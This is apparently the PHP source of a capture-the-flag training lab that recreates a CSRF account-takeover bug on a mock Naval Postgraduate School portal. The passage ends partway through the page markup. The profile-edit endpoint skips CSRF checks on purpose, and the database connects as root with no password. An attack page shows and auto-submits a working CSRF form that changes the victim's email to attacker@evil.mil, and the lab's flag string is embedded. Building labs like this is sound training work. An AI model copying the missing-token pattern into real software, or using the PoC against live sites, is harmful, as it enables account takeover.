<?php
// Lab 1305 — DoD/NPS Microgrid CSRF Account Takeover (HackerOne #2712857)
// Vulnerability: POST /nps/account/profile/edit has NO CSRF token — any origin can
//   POST username/email/password and the server updates the profile immediately.
//   Attacker changes victim's email to attacker-controlled address, then resets password = full ATO.
// Reporter: br0x1337 | Severity: High | Bounty: None (DoD VDP) | Platform: NPS Microgrid Portal
// Flag: flag{dod_nps_csrf_profile_edit_account_takeover_2712857}

session_start();

$db = new mysqli('localhost', 'root', '', 'KrazePlanet_DB');
if ($db->connect_error) {
    die('<h3 style="padding:32px;font-family:sans-serif;color:#c00">DB error: ' . htmlspecialchars($db->connect_error) . '</h3>');
}

$scheme     = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host       = $scheme . '://' . $_SERVER['HTTP_HOST'];
$loginUrl   = $host . '/index.php';
$dashUrl    = $host . '/index.php?action=dashboard';
$profileUrl = $host . '/index.php?action=profile';
$logoutUrl  = $host . '/index.php?logout=1';
$attackUrl  = $host . '/index.php?attack=1';

define('LAB_FLAG', 'flag{dod_nps_csrf_profile_edit_account_takeover_2712857}');
define('VICTIM_EMAIL_ORIGINAL', 'victim@nps.edu');

// ── Tables ─────────────────────────────────────────────────────────────────────
$db->query("CREATE TABLE IF NOT EXISTS lab1305_users (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    username   VARCHAR(100) NOT NULL UNIQUE,
    email      VARCHAR(255) NOT NULL UNIQUE,
    password   VARCHAR(255) NOT NULL,
    first_name VARCHAR(100) NOT NULL DEFAULT '',
    last_name  VARCHAR(100) NOT NULL DEFAULT '',
    role       VARCHAR(50)  NOT NULL DEFAULT 'Researcher',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

// ── Seed ───────────────────────────────────────────────────────────────────────
$sc = $db->query("SELECT COUNT(*) FROM lab1305_users WHERE email IN ('chen@nps.edu','park@nps.edu','torres@nps.edu')")->fetch_row()[0];
if ($sc < 3) {
    $h1 = password_hash('chen@123',   PASSWORD_BCRYPT);
    $h2 = password_hash('park@123',   PASSWORD_BCRYPT);
    $h3 = password_hash('torres@123', PASSWORD_BCRYPT);
    $db->query("INSERT IGNORE INTO lab1305_users (username, email, password, first_name, last_name, role) VALUES
        ('Dr_Chen',     'chen@nps.edu',   '$h1', 'Wei',     'Chen',   'Researcher'),
        ('Lt_Park',     'park@nps.edu',   '$h2', 'Min-Jun', 'Park',   'Researcher'),
        ('Capt_Torres', 'torres@nps.edu', '$h3', 'Rosa',    'Torres', 'Researcher')");
}

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

// ── Route detection ────────────────────────────────────────────────────────────
$action    = $_GET['action'] ?? '';
$isLogout  = isset($_GET['logout']);
$isAttack  = isset($_GET['attack']);
$isProfile = ($action === 'profile');
$error     = '';
$success   = '';

// ── Logout ─────────────────────────────────────────────────────────────────────
if ($isLogout) { session_destroy(); header('Location: ' . $loginUrl); exit; }

// ── Load session user ──────────────────────────────────────────────────────────
$currentUser = null;
if (!empty($_SESSION['lab1305_uid'])) {
    $st = $db->prepare("SELECT * FROM lab1305_users WHERE id = ?");
    $st->bind_param('i', $_SESSION['lab1305_uid']);
    $st->execute();
    $currentUser = $st->get_result()->fetch_assoc();
    $st->close();
}

// ── POST: Profile Edit — VULNERABLE (no CSRF token) ───────────────────────────
if ($isProfile && $_SERVER['REQUEST_METHOD'] === 'POST' && $currentUser) {
    // ⚠ No CSRF token check at all — that is the vulnerability.
    //   Any cross-origin form can POST to this endpoint and modify the victim's profile.
    $newUsername  = trim($_POST['username'] ?? '');
    $newEmail     = trim($_POST['email'] ?? '');
    $newPassword  = $_POST['password'] ?? '';
    $newCPassword = $_POST['cpassword'] ?? '';
    $newFirstName = trim($_POST['first_name'] ?? $currentUser['first_name']);
    $newLastName  = trim($_POST['last_name'] ?? $currentUser['last_name']);

    if (!$newUsername || !$newEmail) {
        $error = 'Username and email are required.';
    } else {
        $uid = $currentUser['id'];
        if ($newPassword && $newPassword === $newCPassword) {
            $hash = password_hash($newPassword, PASSWORD_BCRYPT);
            $st = $db->prepare("UPDATE lab1305_users SET username=?, email=?, password=?, first_name=?, last_name=? WHERE id=?");
            $st->bind_param('sssssi', $newUsername, $newEmail, $hash, $newFirstName, $newLastName, $uid);
        } else {
            $st = $db->prepare("UPDATE lab1305_users SET username=?, email=?, first_name=?, last_name=? WHERE id=?");
            $st->bind_param('ssssi', $newUsername, $newEmail, $newFirstName, $newLastName, $uid);
        }
        $st->execute();
        $st->close();
        // Reload user
        $st = $db->prepare("SELECT * FROM lab1305_users WHERE id = ?");
        $st->bind_param('i', $uid);
        $st->execute();
        $currentUser = $st->get_result()->fetch_assoc();
        $st->close();
        $success = 'Profile updated successfully.';
        if (!$isAttack) {
            // Normal form save redirects back to profile page with success
            header('Location: ' . $profileUrl . '?saved=1');
            exit;
        }
    }
}

// ── POST: Login ────────────────────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isProfile && !$isAttack) {
    $email = trim($_POST['email'] ?? '');
    $pwd   = $_POST['password'] ?? '';
    if ($email && $pwd) {
        $st = $db->prepare("SELECT * FROM lab1305_users WHERE email = ?");
        $st->bind_param('s', $email);
        $st->execute();
        $row = $st->get_result()->fetch_assoc();
        $st->close();
        if ($row && password_verify($pwd, $row['password'])) {
            session_regenerate_id(true);
            $_SESSION['lab1305_uid'] = $row['id'];
            header('Location: ' . $dashUrl);
            exit;
        }
        $error = 'Invalid email or password.';
    } else {
        $error = 'Email and password are required.';
    }
}

// ── Redirect logged-in user from login page ────────────────────────────────────
if ($currentUser && !$isProfile && !$isAttack && !$action) {
    header('Location: ' . $dashUrl);
    exit;
}

// ── Guard: profile/dashboard require login ─────────────────────────────────────
if (!$currentUser && !$isAttack && $action) {
    header('Location: ' . $loginUrl);
    exit;
}

// ── Is the account compromised? ────────────────────────────────────────────────
$isCompromised = $currentUser && ($currentUser['email'] !== VICTIM_EMAIL_ORIGINAL);

// ── Profile save notice from redirect ─────────────────────────────────────────
if (isset($_GET['saved'])) $success = 'Profile updated successfully.';

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<?php if ($isAttack): ?>
<title>CSRF PoC — Burp Suite Professional</title>
<?php elseif ($isProfile): ?>
<title>Edit Profile | NPS Microgrid Portal</title>
<?php elseif ($currentUser): ?>
<title>Dashboard | NPS Microgrid Portal</title>
<?php else: ?>
<title>Sign In | NPS Microgrid Portal</title>
<?php endif; ?>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;min-height:100vh;}

/* ══════════════════════════════════
   SHARED — DoD/NPS Chrome
   ══════════════════════════════════ */
.nps-classbar{background:#000;color:#0f0;font-size:.65rem;font-weight:700;text-align:center;padding:3px 0;letter-spacing:.12em;font-family:'Courier New',monospace;}
.nps-topbar{background:#0A1628;min-height:64px;display:flex;align-items:center;padding:0 24px;gap:14px;border-bottom:3px solid #1B3A5C;}
.nps-crest{width:48px;height:48px;flex-shrink:0;}
.nps-titles{display:flex;flex-direction:column;}
.nps-title-main{font-size:.88rem;font-weight:800;color:#fff;letter-spacing:.04em;text-transform:uppercase;}
.nps-title-sub{font-size:.65rem;color:rgba(255,255,255,.5);letter-spacing:.06em;text-transform:uppercase;margin-top:1px;}
.nps-topbar-right{margin-left:auto;display:flex;align-items:center;gap:14px;}
.nps-topbar-right a{color:rgba(255,255,255,.6);font-size:.72rem;text-decoration:none;font-weight:600;text-transform:uppercase;letter-spacing:.04em;}
.nps-topbar-right a:hover{color:#fff;}
.nps-subbar{background:#1B3A5C;height:36px;display:flex;align-items:center;padding:0 24px;gap:2px;border-bottom:2px solid #2A5080;}
.nps-subnav-link{color:rgba(255,255,255,.6);font-size:.72rem;font-weight:600;text-decoration:none;padding:5px 12px;border-radius:2px;text-transform:uppercase;letter-spacing:.05em;}
.nps-subnav-link:hover,.nps-subnav-link.active{color:#fff;background:rgba(255,255,255,.1);}

/* ══════════════════════════════════
   LOGIN PAGE
   ══════════════════════════════════ */
.nps-login-bg{background:#0A1628;min-height:100vh;display:flex;flex-direction:column;}
.nps-login-body{flex:1;display:flex;align-items:center;justify-content:center;padding:48px 16px;}
.nps-login-card{background:#fff;border-radius:4px;width:100%;max-width:400px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.4);}
.nps-login-card-hdr{background:#0A1628;padding:20px 24px;display:flex;align-items:center;gap:12px;}
.nps-login-card-hdr .nps-crest{width:40px;height:40px;}
.nps-login-hdr-text{font-size:.82rem;font-weight:700;color:#fff;text-transform:uppercase;letter-spacing:.04em;}
.nps-login-body-inner{padding:28px 24px;}
.nps-login-title{font-size:1rem;font-weight:700;color:#0A1628;margin-bottom:4px;}
.nps-login-sub{font-size:.73rem;color:#888;margin-bottom:20px;}
.nps-field{margin-bottom:14px;}
.nps-field label{display:block;font-size:.7rem;font-weight:700;color:#444;text-transform:uppercase;letter-spacing:.06em;margin-bottom:5px;}
.nps-field input{width:100%;border:1px solid #ccc;border-radius:3px;padding:9px 11px;font-size:.85rem;color:#333;font-family:inherit;outline:none;transition:border-color .15s;}
.nps-field input:focus{border-color:#0A1628;box-shadow:0 0 0 2px rgba(10,22,40,.12);}
.nps-btn-primary{width:100%;background:#0A1628;border:none;border-radius:3px;padding:10px;font-size:.85rem;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;text-transform:uppercase;letter-spacing:.04em;transition:background .15s;}
.nps-btn-primary:hover{background:#1B3A5C;}
.nps-error{background:#fef2f2;border:1px solid #fca5a5;border-radius:3px;padding:10px 12px;font-size:.78rem;color:#b91c1c;margin-bottom:14px;}
.nps-login-footer{background:#f5f5f5;border-top:1px solid #eee;padding:12px 24px;font-size:.65rem;color:#aaa;text-align:center;line-height:1.6;}

/* ══════════════════════════════════
   DASHBOARD + PROFILE — Layout
   ══════════════════════════════════ */
.nps-main-bg{background:#EEF1F5;min-height:calc(100vh - 103px);}
.nps-layout{display:flex;min-height:calc(100vh - 103px);}
.nps-sidebar{width:220px;background:#1B3A5C;flex-shrink:0;padding:20px 0;}
.nps-sidebar-section{font-size:.6rem;font-weight:800;color:rgba(255,255,255,.3);text-transform:uppercase;letter-spacing:.1em;padding:0 16px 6px;}
.nps-sidebar-link{display:flex;align-items:center;gap:10px;padding:9px 16px;color:rgba(255,255,255,.7);text-decoration:none;font-size:.78rem;font-weight:600;transition:background .12s;}
.nps-sidebar-link:hover,.nps-sidebar-link.active{background:rgba(255,255,255,.08);color:#fff;}
.nps-sidebar-link svg{width:16px;height:16px;flex-shrink:0;opacity:.7;}
.nps-sidebar-link.active svg{opacity:1;}
.nps-content{flex:1;padding:28px 32px;max-width:900px;}

/* Compromised alert */
.nps-alert-critical{background:#7f1d1d;color:#fff;border-radius:4px;padding:16px 20px;margin-bottom:24px;display:flex;align-items:flex-start;gap:14px;}
.nps-alert-critical-icon{font-size:1.4rem;flex-shrink:0;margin-top:1px;}
.nps-alert-critical-body h4{font-size:.92rem;font-weight:800;margin-bottom:4px;letter-spacing:.02em;}
.nps-alert-critical-body p{font-size:.78rem;opacity:.9;line-height:1.5;}
.nps-flag-box{background:#000;border:2px solid #00ff88;border-radius:3px;padding:10px 16px;margin-top:10px;font-family:'Courier New',monospace;font-size:.82rem;font-weight:700;color:#00ff88;word-break:break-all;}

/* Profile strip */
.nps-profile-strip{background:#fff;border:1px solid #dde3ec;border-radius:4px;padding:14px 18px;margin-bottom:24px;display:flex;align-items:center;gap:16px;}
.nps-avatar{width:42px;height:42px;border-radius:50%;background:#0A1628;display:flex;align-items:center;justify-content:center;font-size:.95rem;font-weight:800;color:#fff;flex-shrink:0;}
.nps-profile-info .nps-profile-name{font-size:.9rem;font-weight:700;color:#0A1628;}
.nps-profile-info .nps-profile-meta{font-size:.72rem;color:#888;margin-top:1px;}
.nps-profile-right{margin-left:auto;display:flex;gap:8px;}
.nps-btn-sm{font-size:.72rem;font-weight:700;padding:6px 12px;border-radius:3px;border:none;cursor:pointer;font-family:inherit;text-decoration:none;display:inline-block;}
.nps-btn-navy{background:#0A1628;color:#fff;}
.nps-btn-navy:hover{background:#1B3A5C;}
.nps-btn-outline-sm{border:1.5px solid #0A1628;color:#0A1628;background:transparent;}
.nps-btn-outline-sm:hover{background:#0A1628;color:#fff;}
.nps-compromised-val{color:#b91c1c;font-weight:800;}

/* Grid cards */
.nps-page-title{font-size:1.15rem;font-weight:800;color:#0A1628;margin-bottom:18px;letter-spacing:-.01em;}
.nps-grid-cards{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:28px;}
.nps-grid-card{background:#fff;border:1px solid #dde3ec;border-radius:4px;padding:16px;}
.nps-grid-card-label{font-size:.65rem;font-weight:700;color:#888;text-transform:uppercase;letter-spacing:.07em;margin-bottom:6px;}
.nps-grid-card-val{font-size:1.4rem;font-weight:800;color:#0A1628;line-height:1;}
.nps-grid-card-sub{font-size:.65rem;color:#aaa;margin-top:4px;}
.nps-grid-card-bar{height:3px;border-radius:2px;margin-top:8px;background:#e0e7f0;}
.nps-grid-card-bar-fill{height:100%;border-radius:2px;}
.nps-section-title{font-size:.8rem;font-weight:800;color:#0A1628;text-transform:uppercase;letter-spacing:.06em;margin-bottom:10px;}
.nps-table{width:100%;border-collapse:collapse;background:#fff;border:1px solid #dde3ec;border-radius:4px;overflow:hidden;font-size:.78rem;}
.nps-table th{background:#f0f3f8;color:#555;font-size:.65rem;text-transform:uppercase;letter-spacing:.06em;padding:8px 12px;text-align:left;border-bottom:1px solid #dde3ec;}
.nps-table td{padding:9px 12px;border-bottom:1px solid #f0f0f0;color:#333;}
.nps-table tr:last-child td{border-bottom:none;}
.nps-badge{display:inline-block;border-radius:2px;font-size:.6rem;font-weight:700;padding:2px 7px;text-transform:uppercase;letter-spacing:.05em;}
.nps-badge-green{background:#dcfce7;color:#166534;}
.nps-badge-yellow{background:#fef9c3;color:#854d0e;}
.nps-badge-red{background:#fee2e2;color:#991b1b;}

/* ══════════════════════════════════
   PROFILE EDIT PAGE
   ══════════════════════════════════ */
.nps-form-card{background:#fff;border:1px solid #dde3ec;border-radius:4px;overflow:hidden;max-width:600px;}
.nps-form-card-hdr{background:#0A1628;padding:12px 20px;}
.nps-form-card-hdr h3{font-size:.82rem;font-weight:700;color:#fff;text-transform:uppercase;letter-spacing:.06em;}
.nps-form-body{padding:24px 20px;}
.nps-form-row{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px;}
.nps-form-row.full{grid-template-columns:1fr;}
.nps-form-field label{display:block;font-size:.68rem;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:.06em;margin-bottom:5px;}
.nps-form-field input{width:100%;border:1px solid #ccc;border-radius:3px;padding:8px 11px;font-size:.83rem;color:#333;font-family:inherit;outline:none;transition:border-color .15s;}
.nps-form-field input:focus{border-color:#0A1628;box-shadow:0 0 0 2px rgba(10,22,40,.1);}
.nps-form-footer{display:flex;align-items:center;gap:10px;padding:14px 20px;border-top:1px solid #eee;background:#f8f9fc;}
.nps-btn-save{background:#0A1628;border:none;border-radius:3px;padding:9px 22px;font-size:.8rem;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;text-transform:uppercase;letter-spacing:.04em;}
.nps-btn-save:hover{background:#1B3A5C;}
.nps-btn-cancel-a{font-size:.78rem;color:#888;text-decoration:none;font-weight:600;}
.nps-btn-cancel-a:hover{color:#333;}
.nps-success-banner{background:#f0fdf4;border:1px solid #86efac;border-radius:3px;padding:10px 14px;font-size:.78rem;color:#166534;margin-bottom:18px;display:flex;align-items:center;gap:8px;}
.nps-vuln-note{background:#fff8e8;border:1px solid #fde68a;border-radius:3px;padding:10px 14px;font-size:.72rem;color:#78350f;margin-top:10px;line-height:1.5;}

/* ══════════════════════════════════
   ATTACK PAGE — Burp Suite PoC
   ══════════════════════════════════ */
.burp-body{background:#3C3F41;min-height:100vh;font-family:'Courier New',Courier,monospace;}
.burp-titlebar{background:#2B2D2F;height:28px;display:flex;align-items:center;padding:0 12px;gap:8px;border-bottom:1px solid #1A1A1A;}
.burp-dot{width:11px;height:11px;border-radius:50%;}
.burp-menubar{background:#3C3F41;height:22px;display:flex;align-items:center;padding:0 8px;gap:0;border-bottom:1px solid #1A1A1A;}
.burp-menuitem{font-size:.7rem;color:#bbb;padding:0 8px;cursor:default;}
.burp-menuitem:hover{background:rgba(255,255,255,.06);color:#fff;}
.burp-toolbar{background:#4B6EAF;height:42px;display:flex;align-items:center;padding:0 16px;gap:10px;border-bottom:2px solid #2B4E8F;}
.burp-toolbar-logo{display:flex;align-items:center;gap:8px;}
.burp-toolbar-logo svg{width:22px;height:22px;}
.burp-toolbar-title{font-size:.95rem;font-weight:700;color:#fff;font-family:Arial,sans-serif;letter-spacing:-.01em;}
.burp-toolbar-sub{font-size:.65rem;color:rgba(255,255,255,.6);font-family:Arial,sans-serif;margin-left:6px;}
.burp-tabs{background:#2B2D2F;display:flex;border-bottom:2px solid #FF6633;}
.burp-tab{font-size:.72rem;font-weight:700;padding:7px 16px;color:#aaa;cursor:default;font-family:Arial,sans-serif;border-right:1px solid #1A1A1A;}
.burp-tab.active{background:#3C3F41;color:#FF6633;border-bottom:2px solid #FF6633;margin-bottom:-2px;}
.burp-pane{padding:20px 24px;}
.burp-section-label{font-size:.65rem;font-weight:700;color:#FF6633;text-transform:uppercase;letter-spacing:.08em;margin-bottom:6px;font-family:Arial,sans-serif;}
.burp-code-block{background:#1E1E1E;border:1px solid #555;border-radius:2px;padding:14px 16px;font-size:.78rem;color:#CE9178;line-height:1.7;white-space:pre;overflow-x:auto;margin-bottom:18px;}
.burp-code-block .kw{color:#569CD6;}
.burp-code-block .attr{color:#9CDCFE;}
.burp-code-block .val{color:#CE9178;}
.burp-code-block .cm{color:#6A9955;}
.burp-info-row{display:flex;gap:24px;margin-bottom:16px;flex-wrap:wrap;}
.burp-info-item{font-family:Arial,sans-serif;}
.burp-info-label{font-size:.6rem;color:#888;text-transform:uppercase;letter-spacing:.07em;margin-bottom:2px;}
.burp-info-val{font-size:.78rem;color:#ddd;}
.burp-info-val.danger{color:#FF6633;font-weight:700;}
.burp-action-bar{background:#2B2D2F;padding:14px 24px;display:flex;align-items:center;gap:12px;border-top:1px solid #1A1A1A;}
.burp-btn-orange{background:#FF6633;border:none;border-radius:3px;padding:8px 20px;font-size:.78rem;font-weight:700;color:#fff;cursor:pointer;font-family:Arial,sans-serif;transition:background .12s;}
.burp-btn-orange:hover{background:#e55a2b;}
.burp-btn-grey{background:#555;border:none;border-radius:3px;padding:8px 16px;font-size:.78rem;color:#ccc;cursor:pointer;font-family:Arial,sans-serif;}
.burp-status{font-size:.72rem;color:#aaa;font-family:Arial,sans-serif;margin-left:auto;}
.burp-status.done{color:#6fce5f;}
.burp-highlight{color:#ffd700;font-weight:700;}

/* Hidden real form */
#realCsrfForm{display:none;}
</style>
</head>
<body>

<?php if ($isAttack): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     ATTACK PAGE — Burp Suite Professional CSRF PoC
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="burp-body">
  <!-- Window chrome -->
  <div class="burp-titlebar">
    <div class="burp-dot" style="background:#FF5F57;"></div>
    <div class="burp-dot" style="background:#FFBD2E;"></div>
    <div class="burp-dot" style="background:#28CA42;"></div>
    <span style="font-size:.65rem;color:#777;margin-left:8px;font-family:Arial,sans-serif;">Burp Suite Professional — [Lab 1305 CSRF PoC]</span>
  </div>
  <div class="burp-menubar">
    <span class="burp-menuitem">Burp</span>
    <span class="burp-menuitem">Project</span>
    <span class="burp-menuitem">Intruder</span>
    <span class="burp-menuitem">Repeater</span>
    <span class="burp-menuitem">Sequencer</span>
    <span class="burp-menuitem">Decoder</span>
    <span class="burp-menuitem">Comparer</span>
    <span class="burp-menuitem">Extender</span>
    <span class="burp-menuitem">Help</span>
  </div>
  <div class="burp-toolbar">
    <div class="burp-toolbar-logo">
      <svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#fff" stroke-width="1.5"/><path d="M12 6v6l4 2" stroke="#FF6633" stroke-width="2" stroke-linecap="round"/></svg>
      <span class="burp-toolbar-title">Burp Suite Professional</span>
      <span class="burp-toolbar-sub">v2024.11.1</span>
    </div>
  </div>

  <!-- Tabs -->
  <div class="burp-tabs">
    <div class="burp-tab">Dashboard</div>
    <div class="burp-tab">Target</div>
    <div class="burp-tab">Proxy</div>
    <div class="burp-tab">Intruder</div>
    <div class="burp-tab">Repeater</div>
    <div class="burp-tab active">CSRF PoC Generator</div>
    <div class="burp-tab">Extensions</div>
  </div>

  <div class="burp-pane">
    <!-- Meta -->
    <div class="burp-info-row">
      <div class="burp-info-item">
        <div class="burp-info-label">Target URL</div>
        <div class="burp-info-val danger"><?= esc($profileUrl) ?></div>
      </div>
      <div class="burp-info-item">
        <div class="burp-info-label">Method</div>
        <div class="burp-info-val danger">POST</div>
      </div>
      <div class="burp-info-item">
        <div class="burp-info-label">CSRF Token</div>
        <div class="burp-info-val danger">❌ NONE DETECTED</div>
      </div>
      <div class="burp-info-item">
        <div class="burp-info-label">SameSite Cookie</div>
        <div class="burp-info-val danger">❌ NOT SET</div>
      </div>
      <div class="burp-info-item">
        <div class="burp-info-label">Origin/Referer Check</div>
        <div class="burp-info-val danger">❌ NOT ENFORCED</div>
      </div>
    </div>

    <!-- Generated PoC -->
    <div class="burp-section-label">Generated CSRF PoC (HTML)</div>
    <div class="burp-code-block"><span class="cm">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
<span class="kw">&lt;html&gt;</span>
  <span class="kw">&lt;body&gt;</span>
    <span class="kw">&lt;form</span> <span class="attr">action</span>=<span class="val">"<?= esc($profileUrl) ?>"</span> <span class="attr">method</span>=<span class="val">"POST"</span><span class="kw">&gt;</span>
      <span class="kw">&lt;input</span> <span class="attr">type</span>=<span class="val">"hidden"</span> <span class="attr">name</span>=<span class="val">"username"</span>   <span class="attr">value</span>=<span class="val">"<span class="burp-highlight">h4ck3r</span>"</span> <span class="kw">/&gt;</span>
      <span class="kw">&lt;input</span> <span class="attr">type</span>=<span class="val">"hidden"</span> <span class="attr">name</span>=<span class="val">"password"</span>   <span class="attr">value</span>=<span class="val">""</span>         <span class="kw">/&gt;</span>
      <span class="kw">&lt;input</span> <span class="attr">type</span>=<span class="val">"hidden"</span> <span class="attr">name</span>=<span class="val">"cpassword"</span>  <span class="attr">value</span>=<span class="val">""</span>         <span class="kw">/&gt;</span>
      <span class="kw">&lt;input</span> <span class="attr">type</span>=<span class="val">"hidden"</span> <span class="attr">name</span>=<span class="val">"email"</span>      <span class="attr">value</span>=<span class="val">"<span class="burp-highlight">attacker@evil.mil</span>"</span> <span class="kw">/&gt;</span>
      <span class="kw">&lt;input</span> <span class="attr">type</span>=<span class="val">"hidden"</span> <span class="attr">name</span>=<span class="val">"save"</span>       <span class="attr">value</span>=<span class="val">"Save"</span>     <span class="kw">/&gt;</span>
      <span class="kw">&lt;input</span> <span class="attr">type</span>=<span class="val">"submit"</span> <span class="attr">value</span>=<span class="val">"Submit request"</span>                    <span class="kw">/&gt;</span>
    <span class="kw">&lt;/form&gt;</span>
    <span class="kw">&lt;script&gt;</span>
      <span class="attr">history</span>.<span class="val">pushState</span>(<span class="val">''</span>, <span class="val">''</span>, <span class="val">'/'</span>);
      <span class="attr">document</span>.<span class="val">forms</span>[<span class="val">0</span>].<span class="val">submit</span>();
    <span class="kw">&lt;/script&gt;</span>
  <span class="kw">&lt;/body&gt;</span>
<span class="kw">&lt;/html&gt;</span></div>

    <!-- Field breakdown -->
    <div class="burp-section-label">Parameter Analysis</div>
    <table style="width:100%;border-collapse:collapse;font-family:Arial,sans-serif;font-size:.73rem;margin-bottom:18px;">
      <tr style="background:#2B2D2F;">
        <th style="text-align:left;padding:7px 10px;color:#aaa;font-weight:600;font-size:.65rem;border-bottom:1px solid #555;">Parameter</th>
        <th style="text-align:left;padding:7px 10px;color:#aaa;font-weight:600;font-size:.65rem;border-bottom:1px solid #555;">Value (Attacker-Controlled)</th>
        <th style="text-align:left;padding:7px 10px;color:#aaa;font-weight:600;font-size:.65rem;border-bottom:1px solid #555;">Impact</th>
      </tr>
      <tr style="border-bottom:1px solid #333;">
        <td style="padding:7px 10px;color:#9CDCFE;font-family:'Courier New',monospace;">username</td>
        <td style="padding:7px 10px;color:#FF6633;font-family:'Courier New',monospace;">h4ck3r</td>
        <td style="padding:7px 10px;color:#ccc;">Victim's username replaced — they lose identity</td>
      </tr>
      <tr style="border-bottom:1px solid #333;">
        <td style="padding:7px 10px;color:#9CDCFE;font-family:'Courier New',monospace;">email</td>
        <td style="padding:7px 10px;color:#FF6633;font-family:'Courier New',monospace;">attacker@evil.mil</td>
        <td style="padding:7px 10px;color:#ccc;">Password reset emails go to attacker → <strong style="color:#FF6633;">Full ATO</strong></td>
      </tr>
      <tr style="border-bottom:1px solid #333;">
        <td style="padding:7px 10px;color:#9CDCFE;font-family:'Courier New',monospace;">password</td>
        <td style="padding:7px 10px;color:#6A9955;font-family:'Courier New',monospace;">(empty)</td>
        <td style="padding:7px 10px;color:#ccc;">Not changed in this PoC — attacker uses email reset instead</td>
      </tr>
      <tr>
        <td style="padding:7px 10px;color:#9CDCFE;font-family:'Courier New',monospace;">csrf_token</td>
        <td style="padding:7px 10px;color:#FF6633;font-family:'Courier New',monospace;">❌ FIELD DOES NOT EXIST</td>
        <td style="padding:7px 10px;color:#ccc;">Server performs no origin validation → exploit succeeds</td>
      </tr>
    </table>
  </div>

  <!-- Action bar -->
  <div class="burp-action-bar">
    <button class="burp-btn-orange" id="pocBtn" onclick="runPoC()">▶  Test in browser</button>
    <button class="burp-btn-grey">Copy HTML</button>
    <button class="burp-btn-grey">Save to file</button>
    <span class="burp-status" id="pocStatus">Ready — victim must be logged in to the target application</span>
  </div>
</div>

<!-- ⚠ Real CSRF form — hidden, auto-submits on "Test in browser" click -->
<form id="realCsrfForm"
      action="/index.php?action=profile"
      method="POST">
  <input type="hidden" name="username"  value="h4ck3r">
  <input type="hidden" name="password"  value="">
  <input type="hidden" name="cpassword" value="">
  <input type="hidden" name="email"     value="attacker@evil.mil">
  <input type="hidden" name="save"      value="Save">
</form>

<script>
function runPoC() {
    var btn = document.getElementById('pocBtn');
    var st  = document.getElementById('pocStatus');
    btn.disabled = true;
    btn.textContent = '⏳  Sending request…';
    st.textContent  = 'POST /index.php?action=profile → waiting for response…';
    st.className    = 'burp-status';
    setTimeout(function() {
        st.textContent = '✔  200 OK — profile updated — redirecting to dashboard…';
        st.className   = 'burp-status done';
        setTimeout(function() {
            document.getElementById('realCsrfForm').submit();
        }, 800);
    }, 700);
}
</script>

<?php elseif ($isProfile && $currentUser): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     PROFILE EDIT PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="nps-classbar">UNCLASSIFIED // FOR OFFICIAL USE ONLY</div>
<header class="nps-topbar">
  <svg class="nps-crest" viewBox="0 0 48 48" fill="none">
    <rect width="48" height="48" rx="4" fill="#1B3A5C"/>
    <polygon points="24,6 42,42 6,42" fill="none" stroke="#CFB87C" stroke-width="2"/>
    <circle cx="24" cy="28" r="7" fill="none" stroke="#CFB87C" stroke-width="1.5"/>
    <text x="24" y="32" text-anchor="middle" font-size="8" fill="#CFB87C" font-weight="bold" font-family="Arial">NPS</text>
  </svg>
  <div class="nps-titles">
    <div class="nps-title-main">Naval Postgraduate School</div>
    <div class="nps-title-sub">Microgrid Management Portal · Monterey, CA</div>
  </div>
  <div class="nps-topbar-right">
    <a href="/index.php?action=dashboard"><?= esc($currentUser['username']) ?></a>
    <a href="/index.php?logout=1">Sign Out</a>
  </div>
</header>
<div class="nps-subbar">
  <a href="/index.php?action=dashboard" class="nps-subnav-link">Dashboard</a>
  <a href="#" class="nps-subnav-link">Grid Reports</a>
  <a href="#" class="nps-subnav-link">Alerts</a>
  <a href="/index.php?action=profile" class="nps-subnav-link active">My Profile</a>
</div>

<div class="nps-layout">
  <nav class="nps-sidebar">
    <div style="padding:0 16px 12px;">
      <div class="nps-sidebar-section">Main</div>
      <a href="/index.php?action=dashboard" class="nps-sidebar-link">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>
        Dashboard
      </a>
      <a href="#" class="nps-sidebar-link">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"/></svg>
        Grid Reports
      </a>
      <a href="#" class="nps-sidebar-link">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"/></svg>
        Alerts
      </a>
      <div class="nps-sidebar-section" style="margin-top:12px;">Account</div>
      <a href="/index.php?action=profile" class="nps-sidebar-link active">
